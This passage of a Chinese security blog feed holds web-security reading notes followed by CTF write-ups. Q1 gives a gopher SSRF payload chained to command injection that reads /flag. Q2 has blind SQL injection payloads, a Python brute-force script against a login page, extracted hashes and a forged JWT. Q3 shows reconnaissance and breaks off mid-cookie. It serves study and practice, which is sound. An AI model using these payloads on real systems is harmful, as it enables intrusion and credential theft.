POST请求等</p><p>完整的CSRF防御方案对于Web框架来说还有以下几处需要改动：</p><p>1、在Session中绑定token，如果不能保存在服务器端的Session中，则保存在Cookie中</p><p>2、在form表单中自动填入token字段</p><p>3、在Ajax请求中自动添加token</p><p>4、在服务器端对比POST提交参数的token与Session中绑定的token是否一致，以验证CSRF攻击</p><h3 id="4、HTTP-Headers管理"><a href="#4、HTTP-Headers管理" class="headerlink" title="4、HTTP Headers管理"></a>4、HTTP Headers管理</h3><p>在Web框架中对HTTP头进行全局化管理</p><h3 id="5、数据持久层与SQL注入"><a href="#5、数据持久层与SQL注入" class="headerlink" title="5、数据持久层与SQL注入"></a>5、数据持久层与SQL注入</h3><p>使用ORM框架对SQL注入有积极意义</p><p>Django中的Database API默认对所有输入进行转义</p><h2 id="第十三章-应用层拒绝服务攻击"><a href="#第十三章-应用层拒绝服务攻击" class="headerlink" title="第十三章 应用层拒绝服务攻击"></a>第十三章 应用层拒绝服务攻击</h2><h3 id="1、应用层DDOS"><a href="#1、应用层DDOS" class="headerlink" title="1、应用层DDOS"></a>1、应用层DDOS</h3><h4 id="1、应对"><a href="#1、应对" class="headerlink" title="1、应对"></a>1、应对</h4><p>1、应用层代码性能优化，将数据库压力转移到内存</p><p>2、网络架构优化：负载均衡，缓解主服务器压力</p><p>3、限制请求频率：</p><h4 id="2、CC攻击"><a href="#2、CC攻击" class="headerlink" title="2、CC攻击"></a>2、CC攻击</h4><p>CC攻击的原理非常简单，就是对一些消耗资源比较大的应用不断发起正常的请求，以达到消耗服务器资源的目的。在Web应用中，查询数据库，读/写硬盘文件等操作，相对都会消耗比较多的资源。</p><h4 id="3、限制请求频率"><a href="#3、限制请求频率" class="headerlink" title="3、限制请求频率"></a>3、限制请求频率</h4><p>最常见的针对应用层DDOS攻击的防御手段，是在应用中针对每个“客户端”做一个请求频率的限制</p><p>但道高一尺，魔高一丈。基于IP地址和Cookie的防御机制可能会随着IP的改变而失效，比如使用“代理服务器”</p><h3 id="2、资源耗尽攻击"><a href="#2、资源耗尽攻击" class="headerlink" title="2、资源耗尽攻击"></a>2、资源耗尽攻击</h3><h4 id="1、Slowloris-攻击"><a href="#1、Slowloris-攻击" class="headerlink" title="1、Slowloris 攻击"></a>1、Slowloris 攻击</h4><p>以极低的速度往服务器发送HTTP请求。由于Web Server对于并发的连接数都有一定的上限，因此若是恶意地占用住这些连接不释放，那么Web Server的所有连接都被恶意连接占用，从而无法接受新的请求，导致拒绝服务。要保持住这个连接，要构造一个畸形的HTTP请求，准确地说，是不完整的HTTP请求，让服务器以为后面还有数据没有传输完成，从而一直保持住连接</p><p>此类拒绝服务攻击的本质，实际上是对有限资源的无限制滥用</p><h4 id="2、HTTP-POST-DOS"><a href="#2、HTTP-POST-DOS" class="headerlink" title="2、HTTP POST DOS"></a>2、HTTP POST DOS</h4><p>发送post包时，指定一个非常大的Content-Length值，然后以非常低的速度发包</p><h4 id="3、Server-Limit-DOS"><a href="#3、Server-Limit-DOS" class="headerlink" title="3、Server Limit DOS"></a>3、Server Limit DOS</h4><p>Apache能接受最大HTTP包头大小8192字节，请求体2G，超长Cookie会认为非正常请求导致客户端拒绝服务</p><h4 id="4、正则ReDOS"><a href="#4、正则ReDOS" class="headerlink" title="4、正则ReDOS"></a>4、正则ReDOS</h4><h2 id="第十四章-PHP安全"><a href="#第十四章-PHP安全" class="headerlink" title="第十四章 PHP安全"></a>第十四章 PHP安全</h2><h3 id="1、文件包含漏洞"><a href="#1、文件包含漏洞" class="headerlink" title="1、文件包含漏洞"></a>1、文件包含漏洞</h3><p>要满足文件包含漏洞，需要满足以下两个条件：</p><p>1）include()等函数通过动态变量的方式引入需要包含的文件</p><p>2）用户能够控制该动态变量</p><h4 id="1、文件本地包含"><a href="#1、文件本地包含" class="headerlink" title="1、文件本地包含"></a>1、文件本地包含</h4><p>设置open_basedir</p><p>尽量避免使用动态变量</p><h4 id="2、远程文件包含"><a href="#2、远程文件包含" class="headerlink" title="2、远程文件包含"></a>2、远程文件包含</h4><p>allow_url_include改成off</p><h4 id="3、本地文件包含的利用技巧"><a href="#3、本地文件包含的利用技巧" class="headerlink" title="3、本地文件包含的利用技巧"></a>3、本地文件包含的利用技巧</h4><p>1、包含用户上传的文件</p><p>2、包含为协议</p><p>3、包含Session文件</p><p>4、包含日治文佳</p><p>5、包含/proc/self/environ文件</p><p>6、包含上传的临时问价</p><p>7、包含其他应用创建的文件</p><h3 id="2、变量覆盖漏洞"><a href="#2、变量覆盖漏洞" class="headerlink" title="2、变量覆盖漏洞"></a>2、变量覆盖漏洞</h3><h4 id="1、全局变量覆盖"><a href="#1、全局变量覆盖" class="headerlink" title="1、全局变量覆盖"></a>1、全局变量覆盖</h4><h4 id="2、extract-变量覆盖"><a href="#2、extract-变量覆盖" class="headerlink" title="2、extract()变量覆盖"></a>2、extract()变量覆盖</h4><h4 id="3、遍历初始化变量"><a href="#3、遍历初始化变量" class="headerlink" title="3、遍历初始化变量"></a>3、遍历初始化变量</h4><h4 id="4、import-request-variables变量覆盖"><a href="#4、import-request-variables变量覆盖" class="headerlink" title="4、import_request_variables变量覆盖"></a>4、import_request_variables变量覆盖</h4><h4 id="5、parse-str-变量副覆盖"><a href="#5、parse-str-变量副覆盖" class="headerlink" title="5、parse_str()变量副覆盖"></a>5、parse_str()变量副覆盖</h4><h4 id="6、安全建议"><a href="#6、安全建议" class="headerlink" title="6、安全建议"></a>6、安全建议</h4><p>1、确保register_globals=OFF，若不能自定义php.ini，则应该在代码中控制</p><p>2、熟悉可能造成变量覆盖的函数和方法，检查用户是否能控制变量来源</p><p>3、养成初始化变量的习惯</p><h3 id="3、代码执行漏洞"><a href="#3、代码执行漏洞" class="headerlink" title="3、代码执行漏洞"></a>3、代码执行漏洞</h3><p>两个条件：</p><p>1、用户能控制函数的输入</p><p>2、存在可以执行代码的危险函数</p><h3 id="4、定制安全的PHP环境"><a href="#4、定制安全的PHP环境" class="headerlink" title="4、定制安全的PHP环境"></a>4、定制安全的PHP环境</h3><p>1、register_globals=OFF</p><p>2、open_basedir限制目录</p><p>3、allow_url_include=OFF</p><p>4、allow_url_fopen=OFF</p><p>5、display_errors=OFF</p><p>6、log_errors=ON</p><p>7、magic_quotes_gpc=OFF</p><p>8、cgi.fix_pathinfo=0</p><p>若是PHP以CGI的方式安装，则需要关闭次此项</p><p>9、session.cookie_httponly=1</p><p>10、session.cookie_secure=1</p><p>若是全站HTTPS则开启此项</p><p>11、safe_mode</p><p>如果是共享环境则开启，如果是单独的应用环境则关闭</p><p>12、disable_funcitons</p><h2 id="第十五章-Web-Server配置安全"><a href="#第十五章-Web-Server配置安全" class="headerlink" title="第十五章 Web Server配置安全"></a>第十五章 Web Server配置安全</h2><h3 id="1、Apache安全"><a href="#1、Apache安全" class="headerlink" title="1、Apache安全"></a>1、Apache安全</h3><p>检查Apache安全的第一件事，就是检查Apache的Module安全情况，根据“最小权限原则”，应该尽可能地减少不必要的Module，对于要使用的Module，则检查其对应的版本是否存在已知的安全漏洞</p><p>然后指定Apache进程以单独的用户身份运行</p><h3 id="2、Nginx安全"><a href="#2、Nginx安全" class="headerlink" title="2、Nginx安全"></a>2、Nginx安全</h3><p>需要注意软件版本的安全，及时升级软件版本</p><h3 id="3、jBoss和Tomcat"><a href="#3、jBoss和Tomcat" class="headerlink" title="3、jBoss和Tomcat"></a>3、jBoss和Tomcat</h3><p>建议直接删除这两个的后台</p><h3 id="4、HTTP-Parameter-Pollution"><a href="#4、HTTP-Parameter-Pollution" class="headerlink" title="4、HTTP Parameter Pollution"></a>4、HTTP Parameter Pollution</h3>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>读书笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>林学长的题目</title>
    <link href="/2020/10/31/%E6%9E%97%E5%AD%A6%E9%95%BF%E7%9A%84%E9%A2%98%E7%9B%AE/"/>
    <url>/2020/10/31/%E6%9E%97%E5%AD%A6%E9%95%BF%E7%9A%84%E9%A2%98%E7%9B%AE/</url>
    
    <content type="html"><![CDATA[<h3 id="Q1"><a href="#Q1" class="headerlink" title="Q1:"></a>Q1:</h3><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(!(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])))&#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-comment">// include_once &quot;ping.php&quot;;</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$link</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(check(<span class="hljs-variable">$link</span>))&#123;<br>        <span class="hljs-variable">$curlobj</span> = curl_init();<br>        curl_setopt(<span class="hljs-variable">$curlobj</span>, CURLOPT_POST, <span class="hljs-number">0</span>);<br>        curl_setopt(<span class="hljs-variable">$curlobj</span>,CURLOPT_URL,<span class="hljs-variable">$link</span>);<br>        curl_setopt(<span class="hljs-variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$result</span> = curl_exec(<span class="hljs-variable">$curlobj</span>);<br>        curl_close(<span class="hljs-variable">$curlobj</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;unknown error&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>) </span>&#123;<br>    <span class="hljs-variable">$url</span> = parse_url(<span class="hljs-variable">$url</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$url</span>[<span class="hljs-string">&#x27;port&#x27;</span>]))&#123;    <span class="hljs-comment">//rewrite url if port exist</span><br>        <span class="hljs-variable">$url</span>[<span class="hljs-string">&#x27;path&#x27;</span>]= <span class="hljs-string">&#x27;:&#x27;</span>.<span class="hljs-variable">$url</span>[<span class="hljs-string">&#x27;port&#x27;</span>].<span class="hljs-variable">$url</span>[<span class="hljs-string">&#x27;path&#x27;</span>];<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$url</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]))&#123;    <span class="hljs-comment"># filter scheme</span><br>        <span class="hljs-keyword">if</span>(strcasecmp(<span class="hljs-variable">$url</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>], <span class="hljs-string">&quot;ftp&quot;</span>) === <span class="hljs-number">0</span> || strcasecmp(<span class="hljs-variable">$url</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>], <span class="hljs-string">&quot;telnet&quot;</span>) === <span class="hljs-number">0</span> || strcasecmp(<span class="hljs-variable">$url</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>], <span class="hljs-string">&quot;dict&quot;</span>) === <span class="hljs-number">0</span> || strcasecmp(<span class="hljs-variable">$url</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>], <span class="hljs-string">&quot;file&quot;</span>) === <span class="hljs-number">0</span> || strcasecmp(<span class="hljs-variable">$url</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>], <span class="hljs-string">&quot;ldap&quot;</span>) === <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$host</span> = <span class="hljs-variable">$url</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br><br><br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/[a-zA-Z]/&#x27;</span>, <span class="hljs-variable">$host</span>))&#123;<br>        <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$host</span>;<br>        <span class="hljs-keyword">if</span>(is_inner_ip_regx(<span class="hljs-variable">$ip</span>))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$ip</span> = gethostbyname(<span class="hljs-variable">$host</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span> ===<span class="hljs-variable">$host</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(is_inner_ip_regx(<span class="hljs-variable">$ip</span>))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_inner_ip_regx</span>(<span class="hljs-params"><span class="hljs-variable">$ip</span></span>)</span>&#123;<br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&quot;/^(127\.0\.0\.1)|(localhost)|(10\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;)|(172\.((1[6-9])|(2\d)|(3[01]))\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;)|(192\.168\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;)$/&quot;</span>;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$ip</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ping.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$remote_ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$remote_ip</span> !== <span class="hljs-string">&quot;127.0.0.1&quot;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Can only be accessed on localhost&quot;</span>;<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br>show_source(<span class="hljs-keyword">__FILE__</span>);<br>extract(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$ip</span> ? <span class="hljs-variable">$ip</span> : <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><br><br><span class="hljs-variable">$ip</span> = myescapeshellarg(<span class="hljs-variable">$ip</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 1 <span class="hljs-subst">$ip</span>&quot;</span>;<br>system(<span class="hljs-variable">$cmd</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myescapeshellarg</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>    <span class="hljs-variable">$data</span> = str_replace(<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;\\\&quot;&quot;</span>, <span class="hljs-variable">$data</span>);<br>    <span class="hljs-variable">$data</span> = str_replace(<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>, <span class="hljs-variable">$data</span>);<br>    <span class="hljs-variable">$data</span> = str_replace(<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$data</span>);<br>    <span class="hljs-variable">$data</span> = str_replace(<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$data</span>);<br>    <span class="hljs-variable">$data</span> = str_replace(<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$data</span>);<br>    <span class="hljs-variable">$data</span> = str_replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$data</span>);<br>    <span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;\&quot;<span class="hljs-subst">$data</span>\&quot;&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="要素："><a href="#要素：" class="headerlink" title="要素："></a>要素：</h4><p>1、curl_setopt可能触发ssrf，以此访问ping.php</p><p>1、gopher协议给ping.php发POST</p><p>2、IP的多种书写形式绕过对IP的格式检测</p><p>3、指令双引号内 换行符+反引号 连接多条命令并执行</p><p>4、%09绕过空格过滤</p><p>5、Content-Length小于实际长度导致Bad request</p><h4 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">url</span>=gopher%<span class="hljs-number">3</span>a%<span class="hljs-number">2</span>f%<span class="hljs-number">2</span>f<span class="hljs-number">0.0.0.0</span>%<span class="hljs-number">3</span>a<span class="hljs-number">80</span>%<span class="hljs-number">2</span>f_POST%<span class="hljs-number">2520</span>%<span class="hljs-number">252</span>fping.php%<span class="hljs-number">2520</span>HTTP%<span class="hljs-number">252</span>f<span class="hljs-number">1</span>.<span class="hljs-number">1</span>%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>AHost%<span class="hljs-number">253</span>a%<span class="hljs-number">2520127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>AContent-Length%<span class="hljs-number">253</span>a%<span class="hljs-number">252030</span>%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>AContent-Type%<span class="hljs-number">253</span>a%<span class="hljs-number">2520</span>application%<span class="hljs-number">252</span>fx-www-form-urlencoded%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>Aip%<span class="hljs-number">253</span>d<span class="hljs-number">8.8.8.8</span>%<span class="hljs-number">250</span>a%<span class="hljs-number">250</span>d%<span class="hljs-number">2560</span>cat%<span class="hljs-number">09</span>/flag%<span class="hljs-number">2560</span><br></code></pre></td></tr></table></figure><h4 id="flag："><a href="#flag：" class="headerlink" title="flag："></a>flag：</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;e<span class="hljs-number">86</span>ca<span class="hljs-number">74653156</span>b<span class="hljs-number">65679</span>f<span class="hljs-number">3807</span>d<span class="hljs-number">78</span>d<span class="hljs-number">10</span>f<span class="hljs-number">9</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="Q2："><a href="#Q2：" class="headerlink" title="Q2："></a>Q2：</h3><h4 id="测试步骤："><a href="#测试步骤：" class="headerlink" title="测试步骤："></a>测试步骤：</h4><p>1、确认回显类型</p><p>单引号包裹且无注释/单引号/ ‘1’=’1等等：无回显</p><p>符号或关键词被检测：回显attack</p><p>字符串/双单引号等等：账号不存在</p><p>1’or 1=1 –+ ： 账号或密码错误</p><p>2、代码逻辑猜测：<br>先执行 select * from table where username = ‘$username’; 并获取查询结果<br>    报错 -&gt; 无回显<br>    无用户 -&gt; 账号不存在<br>    有用户 -&gt;<br>        执行 select * from table where username = ‘​$username’ and password = ‘$password’;(?)</p><p>但是理论上1’or 1=1 –+ 应该会直接登录才对，实际回显账号或密码错误，这，，，，</p><h4 id="陈学长指点："><a href="#陈学长指点：" class="headerlink" title="陈学长指点："></a>陈学长指点：</h4><p>1、收集信息，确认只有登陆点可用，无其他攻击面，于是利用和登陆点有关的攻击手段，比如sql注入</p><p>2、顺手跑几个弱口令，发现了 “账户不存在” 的回显</p><p>3、通常期望中password不存在注入，实际业务中不会明文传输password，利于传输hash后的password，于是测试username的注入情况</p><p>4、通过加引号，加逻辑与加逻辑或发现存在注入，以及 “用户名或密码错误” 的回显</p><p>5、打几个关键词，测试waf，发现了 “attack” 的回显，得到了会对username 进行攻击语句的捕获的逻辑</p><p>6、因此可以推断存在bool盲注</p><p>7、整理后端逻辑：</p><p>​    首先获取 username 和 password</p><p>​    防护的语句肯定会在业务逻辑之前</p><p>​    同时考虑到 账户不存在 和 用户名或密码错误 这两个回显的逻辑关系，前者在前</p><p>8、确认漏洞点。因此有可能存在 username 在两条 sql 语句里的注入点，作了尝试 （1’or 1=1 –+）回显用户名或密码错误排除了第二个注入点，说明只有第一条 sql 的 username 处存在布尔盲注。</p><p>（之所以不考虑uid，username，password三个同步匹配的情况，要从实际出发 ，uid 匹配这种逻辑 在实际中没有意义）</p><h4 id="注入："><a href="#注入：" class="headerlink" title="注入："></a>注入：</h4><p>database部分</p><p>payload：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">&#x27; <span class="hljs-keyword">or</span> mid(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-comment">-- +</span><br></code></pre></td></tr></table></figure><p>爆破得到数据库名：vulrange1</p><p>user部分</p><p>payload：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">&#x27; <span class="hljs-keyword">or</span> mid(user(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-comment">-- +</span><br></code></pre></td></tr></table></figure><p>爆破得到用户名：localhost</p><p>is_admin uid username pasword部分</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>login_url = <span class="hljs-string">&#x27;http://49.234.127.130:10008/login.php&#x27;</span><br>allString = <span class="hljs-string">&#x27;&#x27;&#x27;-atAT1234567890qweryuiopsdfghjklzxcvbnmQWERYUIOPSDFGHJKLZXCVBNM~`!@#$^&amp;*()_=+[]&#123;&#125;;:&#x27;&quot;|\,&lt;.&gt;/?&#x27;&#x27;&#x27;</span><br>re = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> allString:<br>        login_data = &#123;<br>            <span class="hljs-string">&#x27;uid&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>            <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&quot;&#x27; or mid(concat(is_admin,&#x27;-&#x27;,uid,&#x27;-&#x27;,username,&#x27;-&#x27;,password),1,200) like &#x27;&quot;</span> + re + <span class="hljs-string">&quot;%s&quot;</span> % i + <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-string">&quot;&#x27; -- +&quot;</span>,<br>            <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span>,<br>            <span class="hljs-string">&#x27;is_admin&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span><br>        &#125;<br>        res = requests.post(url=login_url, data=login_data).text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;用户名或密码错误！&quot;</span> <span class="hljs-keyword">in</span> res:<br>            re = re + i<br>            print(re)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>得到的用户数据如下：</p><p>1-4453445581-admin_3022-b44bb413ba2dc48362c20aa5ce4440d7</p><p>0-9983275606-test_user-161d2089a4a9d169471082a536c1c410</p><p>发现只有后者可以md5反解，得到密码为tencent@123，登陆后给出需要以admin身份才能看到flag的提示</p><p>抓包分析，直接修改is_admin的值没有作用，又考虑到没有更多的注入点，因此考虑修改cookie，分析cookie结构是jwt，decode后改成admin的参数再encode提交，得到flag</p><h4 id="flag：-1"><a href="#flag：-1" class="headerlink" title="flag："></a>flag：</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;wefjq<span class="hljs-number">124</span>ihhj<span class="hljs-number">47</span>jofe<span class="hljs-number">912</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="Q3："><a href="#Q3：" class="headerlink" title="Q3："></a>Q3：</h3><h4 id="测试步骤：-1"><a href="#测试步骤：-1" class="headerlink" title="测试步骤："></a>测试步骤：</h4><h5 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h5><p>动态验证码注册，生成token登录，应该不存在注入</p><p>有上传文件的功能，php可以乱传，但是看样子应该使用的腾讯云myqcloud（？），估计走不通蚁剑啥的</p><p>御剑和appprint指纹识别失败</p><p>wappalyzer识别web服务器是gunicorn，猜测是flask写的，CDN是jsDelivr，盲区</p><p>抓包收集：</p><p>登录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ''">session&#x3D;eyJfZnJlc2giOmZhbHNlLCJjc3JmX3Rva2VuIjoiYmQ3NjgyZGY0MmVjNDg2MDFmOWEyOGIyMzI5ZjhjOTk4Y2Q2Mzk4NCJ9.X4VYrQ.xZEK_bFFhSIUQ_vxeDK-CRoJVcE<br></code></pre></td></tr></table></figure><p>获取index：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">session</span>=.eJwlj<span class="hljs-number">0</span>tqBDEMBe_i<span class="hljs-number">9</span>QxIsmxLc<span class="hljs-number">5</span>nG<span class="hljs-number">1</span>oeEQALdM<span class="hljs-number">6</span>uQu<span class="hljs-number">8</span>chy<span class="hljs-number">1</span>o<span class="hljs-number">8</span>qt<span class="hljs-number">53</span>OfKM<span class="hljs-number">6608</span>nucrbuV<span class="hljs-number">49</span>_IoJGZ<span class="hljs-number">9</span>zqquOQVZnFZdPpoir<span class="hljs-number">2</span>nhvS<span class="hljs-number">1</span>uTGFqFrmCcHqDNGfnjShJBNLRmTr<span class="hljs-number">1</span>YBKaq<span class="hljs-number">8</span>fwqmyjYV_VpufGFpO<span class="hljs-number">8</span>NqcRmgpQRwKUW<span class="hljs-number">7</span>HrzOP<span class="hljs-number">59</span>RGfu<span class="hljs-number">2</span>eru<span class="hljs-number">5</span>Dnn<span class="hljs-number">5</span>GlA<span class="hljs-number">6</span>ZOkkWVNMVUxbxXFd<span class="hljs-number">671</span>xXn_<span class="hljs-number">4</span>nKqLlG<span class="hljs-number">3</span>MHqvCPGuq<span class="hljs-number">8</span>WG<span class="hljs-number">4</span>lpGgYAUPn<span class="hljs-number">5</span>BeM<span class="hljs-number">1</span>SUI.X<span class="hljs-number">4</span>VYuQ.EKJlGQlo<span 